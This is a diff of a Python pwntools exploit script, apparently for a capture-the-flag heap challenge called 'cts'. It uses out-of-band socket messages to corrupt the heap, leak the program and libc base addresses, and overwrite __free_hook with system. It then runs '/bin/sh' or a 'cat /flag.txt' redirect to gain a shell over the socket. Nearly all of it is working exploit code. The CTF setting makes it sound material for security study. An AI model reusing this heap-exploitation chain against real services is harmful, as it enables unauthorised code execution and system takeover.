@@ -81,7 +81,9 @@ from pwn import *
 context.log_level="debug"
 context.terminal=["tmux","splitw","-h"]
 
-io = process(["./cts","8888"])
+libc_path = "./libc-2.31.so"
+libc = ELF(libc_path,checksec=False)
+io = process(["./cts","8888"],env={"LD_PRELOAD":libc_path})
 p = remote("127.0.0.1","8888")
 p_sock = p.sock
 
@@ -121,38 +123,63 @@ def edit(idx,content):
 def free(idx):
     payload = wrap_packet(1,idx,b"")
     s(payload)
-    sleep(1)
 
 def send_oob(idx):
     payload = b""
-    payload += p64(idx)
+    payload += p8(idx)
     p_sock.send(payload,socket.MSG_OOB)
+
 
 main_addr = r(16)[:14]
 main_addr = int(main_addr,10)
+program_base_addr = main_addr-0x1360
 log.info("get main_addr: {}".format(hex(main_addr)))
 
 gdb.attach(io)
 pause()
-for i in range(8):
-    create(0x200,b"a"*0x1ff)
-create(0x10,b"z"*0xf) # 8 
-for i in range(8):
-    free(7-i)
+for i in range(10):
+    create(0x30,b"\x00"*0x2f)
+    sleep(0.5)
+for i in range(7):
+    free(i)
     sleep(3)
+sleep(1)
+free(7)
+sleep(0.5)
+send_oob(7)
+sleep(0.5)
+send_oob(8) # only idx 9 exists!
+sleep(3)
+for i in range(3):
+    create(0x10,b""*0xf)
+    sleep(1)
+create(0x10,b"") # idx 3.data_chunk
+sleep(1)
+create(0x50,b"")
+sleep(1)
+create(0x50,b"") # idx 5.info_chunk = idx 3.data_chunk
 pause()
-for i in range(8):
-    create(0x200,b"")
+log.info("program_base_addr: {}".format(hex(program_base_addr)))
+stdout_addr = program_base_addr+0x4020
+stdout_addr = p64(stdout_addr)
+edit(3,stdout_addr)
+print_data(5)
 pause()
 
-for i in range(8):
-    print_data(i)
-    ru(b"a"*0x1ef)
-    pause()
+stdout_addr = r(6)
+stdout_addr = int.from_bytes(stdout_addr,"little")
+log.info("stdout_addr: {}".format(hex(stdout_addr)))
+libc_base = stdout_addr -0x1ed6a0
+log.info("libc_base:{}".format(hex(libc_base)))
+free_hook_addr = libc.sym["__free_hook"] + libc_base
+log.info("free_hook_addr:{}".format(hex(free_hook_addr)))
 
-# free(8)
-# sleep(3)
-# send_oob(0)
+edit(3,p64(free_hook_addr))
+edit(5,p64(libc_base+0x52290)) # system addr
+edit(9,b"/bin/sh\x00")
+# 注意 /bin/sh产生的shell并不在socket中，所以你需要利用文件描述符重定向到socket中
+# edit(9,"cat /flag.txt >&4")
+send_oob(9)
 
 p.interactive()
 ```
